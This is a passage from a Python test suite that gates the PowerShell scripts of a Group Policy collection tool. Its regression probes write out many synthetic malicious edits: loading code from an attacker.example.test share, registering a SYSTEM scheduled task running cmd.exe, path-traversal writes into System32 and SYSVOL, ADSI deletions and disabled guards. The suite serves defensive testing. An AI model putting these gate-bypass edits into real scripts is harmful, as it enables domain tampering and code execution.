                    _dump_golden(committed).splitlines(),
                    _dump_golden(current).splitlines(),
                    fromfile="committed",
                    tofile="current",
                    lineterm="",
                )
            )[:120]
        )
        raise AssertionError(
            "collector syntax-tree inventory changed. A reviewer must confirm the diff, then "
            "regenerate with `python scripts/gen_collector_inventory.py`:\n" + diff
        )


# Files PowerShell can load as code or configuration. Every one under scripts/
# must be classified (Sol round-3: a .psm1 was outside the glob).
_POWERSHELL_SUFFIXES = (".ps1", ".psm1", ".psd1", ".ps1xml", ".cdxml", ".pssc", ".psrc")


def _unclassified_scripts(root: Path) -> tuple[list[str], list[str]]:
    on_disk = {
        p.relative_to(root).as_posix()
        for p in root.rglob("*")
        if p.is_file() and p.suffix.casefold() in _POWERSHELL_SUFFIXES
    }
    classified = set(POLICIES) | set(OUT_OF_SCOPE)
    return sorted(on_disk - classified), sorted(classified - on_disk)


def test_every_script_is_classified() -> None:
    unclassified, missing = _unclassified_scripts(_SCRIPTS)
    assert not unclassified and not missing, (
        "Every PowerShell file under scripts/ must be in POLICIES or OUT_OF_SCOPE: "
        f"unclassified {unclassified}, missing {missing}"
    )


def test_module_files_need_classification(tmp_path: Path) -> None:
    for name in (*POLICIES, *OUT_OF_SCOPE):
        (tmp_path / name).write_text("", encoding="utf-8")
    (tmp_path / "GpoLensReviewerPayload.psm1").write_text("", encoding="utf-8")
    (tmp_path / "nested").mkdir()
    (tmp_path / "nested" / "Payload.psd1").write_text("@{}", encoding="utf-8")
    unclassified, missing = _unclassified_scripts(tmp_path)
    assert unclassified == ["GpoLensReviewerPayload.psm1", "nested/Payload.psd1"]
    assert missing == []


def test_policy_tables_cover_every_script() -> None:
    for table_name, table in (
        ("WRITE_ROOTS", WRITE_ROOTS),
        ("PINNED_VARS", PINNED_VARS),
        ("INSTANCE_RECEIVERS", INSTANCE_RECEIVERS),
        ("WRITE_TARGET_EXPRESSIONS", WRITE_TARGET_EXPRESSIONS),
        ("SPECIAL_BINDINGS", SPECIAL_BINDINGS),
        ("INDEX_ASSIGNMENT_ROOTS", INDEX_ASSIGNMENT_ROOTS),
        ("COMMON_PARAM_TARGETS", COMMON_PARAM_TARGETS),
        ("LOCAL_FUNCTIONS", LOCAL_FUNCTIONS),
        ("LOCAL_FUNCTION_BODIES", LOCAL_FUNCTION_BODIES),
        ("SECRET_USES", SECRET_USES),
        ("SCRIPT_HEADERS", SCRIPT_HEADERS),
        ("SECRET_VARIABLES", SECRET_VARIABLES),
        ("REMOTE_LITERALS", REMOTE_LITERALS),
        ("GUARDED_OPS", GUARDED_OPS),
    ):
        assert set(table) == set(POLICIES), f"{table_name} must have an entry per script"


def test_forbidden_commands_are_never_allowlisted() -> None:
    forbidden = {_cf(c) for c in FORBIDDEN_COMMANDS}
    for script, policy in POLICIES.items():
        hits = sorted(c for c in policy.commands if _cf(c) in forbidden)
        assert not hits, f"{script}: allowlists never-allowed commands {hits}"


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_parses_without_errors(inventory: dict[str, dict[str, Any]], script: str) -> None:
    assert inventory[script]["parse_errors"] == []


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_commands_are_allowlisted(inventory: dict[str, dict[str, Any]], script: str) -> None:
    policy = POLICIES[script]
    local = set(inventory[script]["functions"])
    for source in policy.dot_sources:
        local |= set(inventory[source]["functions"])
    check_commands(script, inventory[script], local)


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_dotnet_calls_are_allowlisted(inventory: dict[str, dict[str, Any]], script: str) -> None:
    check_dotnet(script, inventory[script])
    check_types(script, inventory[script])
    check_instance_receivers(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_no_using_or_disallowed_redirection(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_usings(script, inventory[script])
    check_redirections(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_new_object_and_add_type(inventory: dict[str, dict[str, Any]], script: str) -> None:
    check_new_object_and_add_type(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_local_writes_stay_under_declared_roots(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_writes(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_pinned_variables_are_not_rebound(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_pinned_bindings(script, inventory)


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_scheduled_task_arguments_are_pinned(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_task_action(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_whole_tree_screens(inventory: dict[str, dict[str, Any]], script: str) -> None:
    check_ast(script, inventory[script])
    check_local_functions(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_no_unpinnable_or_engine_bindings(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_bindings(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_write_and_exec_operations_keep_their_guards(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_guarded_ops(script, inventory)


def test_ad_and_group_policy_cmdlets_are_reads_only() -> None:
    """Every AD/GroupPolicy noun-verb in an allowlist is a Get-*, and only the
    registration script may name the scheduled-task cmdlets."""
    task_cmdlets = {
        "New-ScheduledTask",
        "New-ScheduledTaskAction",
        "New-ScheduledTaskPrincipal",
        "New-ScheduledTaskSettingsSet",
        "New-ScheduledTaskTrigger",
        "Register-ScheduledTask",
        "Unregister-ScheduledTask",
    }
    for script, policy in POLICIES.items():
        directory = {c for c in policy.commands if re.match(r"^\w+-(AD|GP)", c)}
        assert all(c.startswith("Get-") for c in directory), (script, sorted(directory))
        tasks = policy.commands & task_cmdlets
        if script != _TASK_ACTION_SCRIPT:
            assert not tasks, f"{script} must not touch Task Scheduler: {sorted(tasks)}"


# ---------------------------------------------------------------------------
# Regression suite: every reviewer probe (both lineages) must be flagged. Each
# probe appends/prepends one malicious edit to a copy of a real script; the
# full gate must raise for that script. A clean copy must pass.
# ---------------------------------------------------------------------------

# (id, base script, mode, edit). mode is "append"/"prepend" (edit = snippet),
# "before" (edit = (marker, snippet)) or "replace" (edit = (old, new)); the
# marker/old text must occur exactly once. Snippets are synthetic and use
# example.test / LABDOMAIN placeholders only.
Probe = tuple[str, str, str, str | tuple[str, str]]
_REGRESSIONS: list[Probe] = [
    # --- Sol probes ---
    (
        "sol_root_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "$OutputRoot = '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "sol_registry_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "$OutputRoot = 'HKLM:\\Software\\GpoLensGateBypass'\n"
        "New-Item -Path $OutputRoot -Force | Out-Null\n",
    ),
    (
        "sol_set_itemtype",
        "Export-GpoEstate.ps1",
        "append",
        "New-Item -Path $OutputRoot -ItemType SymbolicLink "
        "-Value '\\\\dc.example.test\\SYSVOL\\example.test\\Policies' -Force | Out-Null\n",
    ),
    (
        "sol_redirection",
        "Export-GpoEstate.ps1",
        "append",
        "'owned' > '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n",
    ),
    (
        "sol_redirection_stream",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Host 'owned' 6> '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n",
    ),
    (
        "sol_get_gporeport_path",
        "Export-GpoEstate.ps1",
        "append",
        "Get-GPOReport -All -ReportType Xml "
        "-Path '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\overwritten.xml'\n",
    ),
    (
        "sol_instance_delete",
        "Export-GpoEstate.ps1",
        "append",
        "$unownedFile = Get-Item -LiteralPath "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml'\n"
        "$unownedFile.Delete()\n",
    ),
    (
        "sol_adsi_delete",
        "Export-GpoEstate.ps1",
        "append",
        "$domain = [ADSI]'WinNT://LABDOMAIN,domain'\n$domain.Delete('user', 'victim')\n",
    ),
    ("sol_using_module", "Export-GpoEstate.ps1", "prepend", "using module ./GateEvil.psm1\n"),
    (
        "sol_collector_rebind",
        "Run-GpoLensCollection.ps1",
        "append",
        "$CollectorPath = '\\\\attacker.example.test\\share\\Mutate-Domain.ps1'\n",
    ),
    (
        "sol_task_abuse",
        "Register-GpoLensCollection.ps1",
        "append",
        "$evilAction = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c whoami'\n"
        "$evilTask = New-ScheduledTask -Action $evilAction -Principal $principal\n"
        "Register-ScheduledTask -TaskName 'GpoLensGateBypass' -InputObject $evilTask -Force\n",
    ),
    # --- DeepSeek probes ---
    (
        "ds_writeroot_var",
        "Export-GpoEstate.ps1",
        "append",
        "$dest = Join-Path 'C:\\Windows\\System32' 'evil.dll'\n"
        "Remove-Item -LiteralPath $dest -Force -ErrorAction SilentlyContinue\n",
    ),
    (
        "ds_writeroot_run",
        "Run-GpoLensCollection.ps1",
        "append",
        "$LogPath = 'C:\\Windows\\System32\\evil.log'\n"
        "[IO.File]::AppendAllText($LogPath, 'owned', [Text.UTF8Encoding]::new($false))\n",
    ),
    (
        "ds_adsi_copyto_marker",
        "GpoLensCollectionMarker.ps1",
        "append",
        "([ADSI]'LDAP://CN=victim,OU=x,DC=example,DC=test')"
        ".CopyTo('LDAP://OU=evil,DC=example,DC=test')\n",
    ),
    (
        "ds_register_args",
        "Register-GpoLensCollection.ps1",
        "append",
        "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c whoami'\n"
        "$p = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount\n"
        "$t = New-ScheduledTask -Action $a -Principal $p\n"
        "Register-ScheduledTask -TaskName 'NotGpoLens' -InputObject $t -Force\n",
    ),
    (
        "ds_using_assembly",
        "Export-GpoEstate.ps1",
        "prepend",
        "using assembly System.DirectoryServices\n",
    ),
    # --- Negative controls from both lineages (must already be rejected) ---
    (
        "neg_set_adobject",
        "Export-GpoEstate.ps1",
        "append",
        "Set-ADObject -Identity 'x' -Replace @{description='y'}\n",
    ),
    (
        "neg_adsi_commit",
        "Export-GpoEstate.ps1",
        "append",
        "$e = [ADSI]'LDAP://CN=victim,DC=example,DC=test'\n$e.CommitChanges()\n",
    ),
    (
        "neg_dynamic_member",
        "Export-GpoEstate.ps1",
        "append",
        "$e = [ADSI]'LDAP://CN=victim,DC=example,DC=test'\n$m = 'CommitChanges'\n$e.$m()\n",
    ),
    ("neg_com", "Export-GpoEstate.ps1", "append", "New-Object -ComObject 'WScript.Shell'\n"),
    (
        "neg_namespace_de",
        "Export-GpoEstate.ps1",
        "prepend",
        "using namespace System.DirectoryServices\n",
    ),
    (
        "neg_splat_write",
        "Export-GpoEstate.ps1",
        "append",
        "$w = @{ LiteralPath = "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'; Value = 'owned' }\n"
        "Set-Content @w\n",
    ),
    (
        "neg_addtype_inline",
        "Export-GpoEstate.ps1",
        "append",
        "Add-Type -TypeDefinition 'public static class P { public static void R() {} }'\n",
    ),
    (
        "neg_import_module_unc",
        "Export-GpoEstate.ps1",
        "append",
        "Import-Module '\\\\attacker.example.test\\share\\Evil.psm1'\n",
    ),
    # --- Sol round-2 candidates (19), each previously accepted ---
    # BL-1: variable-writing common parameters rebind a pinned variable.
    (
        "r2_outvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable OutputRoot | Out-Null\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_pipelinevariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -PipelineVariable OutputRoot | "
        "ForEach-Object { Set-Content -LiteralPath $OutputRoot -Value 'owned' }\n",
    ),
    (
        "r2_errorvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Error 'C:\\Windows\\Temp\\gate.txt' -ErrorVariable OutputRoot "
        "-ErrorAction SilentlyContinue\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_warningvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Warning 'C:\\Windows\\Temp\\gate.txt' -WarningVariable OutputRoot\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_informationvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Host 'C:\\Windows\\Temp\\gate.txt' -InformationVariable OutputRoot\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_collectorpath_outvariable_override",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '\\\\attacker.example.test\\share\\Mutate.ps1' "
        "-OutVariable CollectorPath | Out-Null\n",
    ),
    (
        "r2_taskargs_outvariable_override",
        "Register-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '\\\\attacker.example.test\\share\\payload.ps1' "
        "-OutVariable taskArgs | Out-Null\n",
    ),
    # BL-2: receiver-less / parenthesized receivers on side-effecting methods.
    (
        "r2_parenthesized_receiver_delete",
        "Run-GpoLensCollection.ps1",
        "append",
        "(Get-Item -LiteralPath "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml').Delete()\n",
    ),
    (
        "r2_parenthesized_receiver_open_write",
        "Run-GpoLensCollection.ps1",
        "append",
        "(Get-Item -LiteralPath 'C:\\Windows\\win.ini')."
        "Open([IO.FileMode]::Open, [IO.FileAccess]::Write).Write([byte[]](65), 0, 1)\n",
    ),
    (
        "r2_parenthesized_fileinfo_copyto_sysvol",
        "GpoLensCollectionMarker.ps1",
        "append",
        "(Get-Item -LiteralPath 'C:\\Windows\\win.ini')."
        "CopyTo('\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\evil.ini', $true)\n",
    ),
    (
        "r2_wmi_remote_instance_delete",
        "Run-GpoLensCollection.ps1",
        "append",
        "([WMI]'\\\\server.example.test\\root\\cimv2:Win32_Environment.Name=\"GATE\"').Delete()\n",
    ),
    # BL-3: scheduled-task operation not pinned.
    (
        "r2_taskname_direct_rebind",
        "Register-GpoLensCollection.ps1",
        "append",
        "$TaskName = '\\Microsoft\\Windows\\Defrag\\ScheduledDefrag'\n",
    ),
    (
        "r2_task_unregister_wildcard",
        "Register-GpoLensCollection.ps1",
        "append",
        "Unregister-ScheduledTask -TaskName '*' -Confirm:$false\n",
    ),
    (
        "r2_task_register_remote_cimsession",
        "Register-GpoLensCollection.ps1",
        "append",
        "Register-ScheduledTask -TaskName $TaskName -InputObject $task "
        "-CimSession 'server.example.test' -Force | Out-Null\n",
    ),
    (
        "r2_task_principal_runlevel_highest",
        "Register-GpoLensCollection.ps1",
        "append",
        "$principal = New-ScheduledTaskPrincipal -UserId $account "
        "-LogonType Password -RunLevel Highest\n",
    ),
    # BL-4: pinned root plus unchecked child data.
    (
        "r2_env_via_second_variable",
        "Export-GpoEstate.ps1",
        "append",
        "$segment = $env:GPO_LENS_ESCAPE\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
    ),
    (
        "r2_dotdot_via_second_variable",
        "Export-GpoEstate.ps1",
        "append",
        "$segment = '..\\..\\Windows\\Temp\\gate.txt'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
    ),
    (
        "r2_computed_dotdot_via_second_variable",
        "Export-GpoEstate.ps1",
        "append",
        "$segment = ([char]46) + ([char]46) + '\\Windows\\Temp\\gate.txt'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
    ),
    (
        "r2_new_item_name_traversal",
        "Export-GpoEstate.ps1",
        "append",
        "New-Item -Path $OutputRoot -Name '..\\..\\Windows\\Temp\\gate.txt' "
        "-ItemType File -Force | Out-Null\n",
    ),
    # --- DeepSeek round-2 candidates ---
    # NEW-BL-1: `..` carried in a non-root child variable / other write forms.
    (
        "ds_dotdot_child_var",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\..\\..\\Windows\\System32\\evil.dll'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $sub) -Value 'owned'\n",
    ),
    (
        "ds_interp_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\nSet-Content -LiteralPath \"$OutputRoot\\$sub\" -Value 'owned'\n",
    ),
    (
        "ds_writealltext_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n[IO.File]::WriteAllText((Join-Path $OutputRoot $sub), 'owned')\n",
    ),
    (
        "ds_copyitem_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n"
        "Copy-Item -LiteralPath $testFile -Destination (Join-Path $OutputRoot $sub) -Force\n",
    ),
    (
        "ds_getgporeport_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n"
        "Get-GPOReport -All -ReportType Xml -Path (Join-Path $OutputRoot $sub)\n",
    ),
    (
        "ds_function_wrapped_write",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n"
        "function Invoke-GateWrite { Set-Content -LiteralPath (Join-Path $OutputRoot $sub) "
        "-Value 'owned' }\nInvoke-GateWrite\n",
    ),
    # NEW-BL-2: scope-qualified and foreach rebinds of pinned roots / exec sink.
    (
        "ds_script_scope_outputroot",
        "Export-GpoEstate.ps1",
        "append",
        "$script:OutputRoot = 'C:\\Windows\\System32'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot 'evil.dll') -Value 'owned'\n",
    ),
    (
        "ds_foreach_abs_root",
        "Export-GpoEstate.ps1",
        "append",
        "$evil = 'C:\\Windows\\System32'\n"
        "foreach ($OutputRoot in $evil) { Set-Content -LiteralPath "
        "(Join-Path $OutputRoot 'evil.dll') -Value 'owned' }\n",
    ),
    (
        "ds_script_collectorpath",
        "Run-GpoLensCollection.ps1",
        "append",
        "$script:CollectorPath = '\\\\attacker.example.test\\share\\Mutate-Domain.ps1'\n",
    ),
    (
        "ds_script_windowsroot",
        "Register-GpoLensCollection.ps1",
        "append",
        "$script:windowsRoot = 'C:\\attacker'\n",
    ),
    (
        "ds_script_logpath",
        "Run-GpoLensCollection.ps1",
        "append",
        "$script:LogPath = 'C:\\Windows\\System32\\evil.log'\n",
    ),
    # --- Round-3 candidates (Sol / DeepSeek), each previously accepted ---
    # Sol BL-2: receiver rebind onto an allowlisted side-effecting method.
    (
        "r3_receiver_rebind_delete",
        "Run-GpoLensCollection.ps1",
        "append",
        "$entry = Get-Item -LiteralPath "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml'\n"
        "$entry.Delete()\n",
    ),
    # Sol BL-2: the exact allowed vector, duplicated outside ShouldProcess.
    (
        "r3_unregister_duplicate",
        "Register-GpoLensCollection.ps1",
        "append",
        "Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false\n",
    ),
    # Sol BL-2: alias-provider assignment re-points a later Get-Item.
    (
        "r3_alias_provider",
        "Run-GpoLensCollection.ps1",
        "before",
        ("if ($MyInvocation.InvocationName -ne '.')", "${Alias:Get-Item} = 'Remove-Item'\n"),
    ),
    # Sol BL-1: #Requires auto-imports a module (not an AST node the old
    # inventory recorded).
    (
        "r3_requires_module",
        "Export-GpoEstate.ps1",
        "prepend",
        "#Requires -Modules GpoLensReviewerPayload\n",
    ),
    # Sol BL-1: weaken the reparse-point guard (-or -> -and).
    (
        "r3_guard_or_to_and",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "if (-not $root.PSIsContainer -or ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint))",
            "if (-not $root.PSIsContainer -and ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint))",
        ),
    ),
    # Sol BL-1: move the guard after the delete/create it protects.
    (
        "r3_reorder_guard_after_open",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "    if (-not $root.PSIsContainer -or ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint)) {\n"
            "        throw 'Registration refuses a linked output root.'\n"
            "    }\n"
            "    $marker = Join-Path $root.FullName '.gpo-lens-collection-owner'\n"
            "    # File.Delete unlinks this directory entry; it never writes through a link.\n"
            "    # CreateNew refuses an object substituted between deletion and creation.\n"
            "    [IO.File]::Delete($marker)\n"
            "    $stream = [IO.File]::Open($marker, [IO.FileMode]::CreateNew, "
            "[IO.FileAccess]::Write, [IO.FileShare]::None)\n",
            "    $marker = Join-Path $root.FullName '.gpo-lens-collection-owner'\n"
            "    [IO.File]::Delete($marker)\n"
            "    $stream = [IO.File]::Open($marker, [IO.FileMode]::CreateNew, "
            "[IO.FileAccess]::Write, [IO.FileShare]::None)\n"
            "    if (-not $root.PSIsContainer -or ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint)) {\n"
            "        throw 'Registration refuses a linked output root.'\n"
            "    }\n",
        ),
    ),
    # DeepSeek NEW-BL-1: $PSDefaultParameterValues injects -CimSession into the
    # pinned Register-ScheduledTask call (and parameters anywhere else).
    (
        "r3_psdefault_register_cimsession",
        "Register-GpoLensCollection.ps1",
        "before",
        (
            "function ConvertTo-GpoLensTaskArgument",
            "$PSDefaultParameterValues['Register-ScheduledTask:CimSession'] = "
            "'server.example.test'\n",
        ),
    ),
    (
        "r3_psdefault_export",
        "Export-GpoEstate.ps1",
        "append",
        "$PSDefaultParameterValues['Get-GPOReport:Path'] = "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\overwritten.xml'\n",
    ),
    (
        "r3_psdefault_run",
        "Run-GpoLensCollection.ps1",
        "append",
        "$PSDefaultParameterValues['Remove-Item:Recurse'] = $true\n",
    ),
    # DeepSeek NEW-BL-2: retention guard moved after the recursive delete.
    (
        "r3_reorder_retention_guard",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "            Assert-GpoLensRegularTree -Root $folder\n"
            "            Remove-Item -LiteralPath $archive.FullName -Force\n"
            "            Remove-Item -LiteralPath $folder -Recurse -Force\n",
            "            Remove-Item -LiteralPath $archive.FullName -Force\n"
            "            Remove-Item -LiteralPath $folder -Recurse -Force\n"
            "            Assert-GpoLensRegularTree -Root $folder\n",
        ),
    ),
    # DeepSeek NEW-BL-3 / NON-BL-2: computed common-parameter variable names.
    (
        "r3_outvariable_computed",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable ('Output' + 'Root') | Out-Null\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r3_outvariable_indirect_var",
        "Export-GpoEstate.ps1",
        "append",
        "$n = 'OutputRoot'\n"
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable $n | Out-Null\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r3_errorvariable_computed",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\gate-missing' -ErrorVariable ('Log' + 'Path') "
        "-ErrorAction SilentlyContinue | Out-Null\n",
    ),
    (
        "r3_outvariable_braced",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable ${OutputRoot} | Out-Null\n",
    ),
    # DeepSeek NON-BL-1 / NON-BL-5: a member call's later argument changed.
    (
        "r3_member_later_argument",
        "Export-GpoEstate.ps1",
        "replace",
        (
            '[System.IO.File]::WriteAllText($testFile, "test")',
            '[System.IO.File]::WriteAllText($testFile, "owned")',
        ),
    ),
    (
        "r3_marker_open_mode",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "[IO.File]::Open($Marker, [IO.FileMode]::Open, [IO.FileAccess]::Read, "
            "[IO.FileShare]::Read)",
            "[IO.File]::Open($Marker, [IO.FileMode]::Open, [IO.FileAccess]::ReadWrite, "
            "[IO.FileShare]::Read)",
        ),
    ),
    # --- Same classes, found while fixing round 3 (also accepted at d1d4bef) ---
    # A root read by a pinned binding was itself unpinned.
    (
        "r4_marker_root_rebind",
        "GpoLensCollectionMarker.ps1",
        "append",
        "$root = Get-Item -LiteralPath '\\\\dc.example.test\\SYSVOL\\example.test\\Policies'\n",
    ),
    # A local function's root parameter bound at a new call site.
    (
        "r4_callsite_marker_root",
        "Register-GpoLensCollection.ps1",
        "append",
        "Write-GpoLensOwnerMarkerBytes -OutputRoot "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies' -Bytes ([byte[]](65))\n",
    ),
    (
        "r4_callsite_log_path",
        "Run-GpoLensCollection.ps1",
        "append",
        "Write-GpoLensCollectionLog -LogPath 'C:\\Windows\\System32\\evil.log' -Message 'x' "
        "-LogMaxBytes 1024 -LogFiles 1\n",
    ),
    # Multiple assignment and a filesystem-drive variable write.
    (
        "r4_multi_assignment_root",
        "Export-GpoEstate.ps1",
        "append",
        "$OutputRoot, $gateCount = 'C:\\Windows\\System32', 1\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r4_drive_variable_write",
        "Export-GpoEstate.ps1",
        "append",
        "${C:\\Windows\\Temp\\gate.txt} = 'owned'\n",
    ),
    (
        "r4_env_psmodulepath",
        "Export-GpoEstate.ps1",
        "append",
        "$env:PSModulePath = '\\\\attacker.example.test\\share'\n",
    ),
    # ForEach-Object invoking a method by name.
    (
        "r4_foreach_object_member",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml' "
        "| ForEach-Object Delete\n",
    ),
    # A guard function redefined as a no-op before the entry point runs.
    (
        "r4_guard_function_redefined",
        "Run-GpoLensCollection.ps1",
        "before",
        ("if ($MyInvocation.InvocationName -ne '.')", "function Assert-GpoLensRegularTree { }\n"),
    ),
    # Child data in a pinned write-target expression rebound.
    (
        "r4_safe_name_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "$safe = '..\\..\\..\\Windows\\System32\\evil'\n",
    ),
    # [ref] hands a pinned root to a writer.
    (
        "r4_ref_rebind_root",
        "Run-GpoLensCollection.ps1",
        "append",
        "[guid]::TryParse('x', [ref]$OutputRoot) | Out-Null\n",
    ),
    # --- Round-4 candidates (Sol; DeepSeek helper class), each previously accepted ---
    # Sol BL-1: a helper's emitted value changed to an outside-root FileInfo,
    # which the pinned catch-path Remove-Item then deletes.
    (
        "r4s_helper_returns_outside_file",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "if ($zip.GetEntry('AllGPOs.xml')) { $archive }",
            "if ($zip.GetEntry('AllGPOs.xml')) { Get-Item -LiteralPath "
            "'C:\\Windows\\System32\\drivers\\etc\\hosts' }",
        ),
    ),
    # Sol BL-2: the task-argument helper returns a constant UNC -File target.
    (
        "r4s_task_quote_helper_remote_script",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\"'",
            "return '\"\\\\attacker.example.test\\share\\Mutate-Domain.ps1\"'",
        ),
    ),
    # DeepSeek round 4: the same helper class.
    (
        "r4d_helper_taskarg_append",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\"'\n",
            "    return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\" & calc'\n",
        ),
    ),
    (
        "r4d_helper_abspath_change",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    return [IO.Path]::GetFullPath($Value)\n",
            "    return 'C:\\Windows\\Temp\\hijacked'\n",
        ),
    ),
    # Sol BL-3: the collection lock released before the protected block.
    (
        "r4s_early_lock_dispose",
        "Run-GpoLensCollection.ps1",
        "before",
        (
            "    $logArgs = @{LogPath=(Join-Path $OutputRoot 'collection.log');",
            "    $lock.Dispose()\n",
        ),
    ),
    # Sol NB-1: a write helper called outside its caller's guard.
    (
        "r4s_caller_guard_duplicate_marker_write",
        "Register-GpoLensCollection.ps1",
        "before",
        (
            "if ($MyInvocation.InvocationName -ne '.')",
            "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot "
            "-Bytes ([Text.UTF8Encoding]::new($false).GetBytes($TaskName))\n",
        ),
    ),
    # Sol NB-3: a rejected Add-Type form must be a check failure, not a crash.
    (
        "r4s_add_type_path",
        "Export-GpoEstate.ps1",
        "append",
        "Add-Type -Path 'C:\\reviewer-evil.dll'\n",
    ),
    # Sol NB-2: CR bytes inside the existing here-string (old golden: SAME).
    (
        "r4s_here_string_crlf",
        "GpoLensCollectionMarker.ps1",
        "replace",
        ("namespace GpoLens {\n", "namespace GpoLens {\r\n"),
    ),
    # Cross-repo class 2: a ForEach-Object / Where-Object / .ForEach()
    # scriptblock runs in the caller's scope, so an unqualified assignment in it
    # rebinds the caller's pinned variable.
    (
        "r4x_foreach_object_scope_rebind",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-ChildItem -LiteralPath $OutputRoot | ForEach-Object { $OutputRoot = 'C:\\Windows' }\n",
    ),
    (
        "r4x_where_object_scope_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "Get-ChildItem -LiteralPath $OutputRoot | "
        "Where-Object { ($dest = 'C:\\Windows\\System32') }\n",
    ),
    (
        "r4x_intrinsic_foreach_scope_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "@(1).ForEach({ $OutputRoot = 'C:\\Windows' })\n",
    ),
    # Per-scope pinning: an existing pinned binding copied into another function.
    (
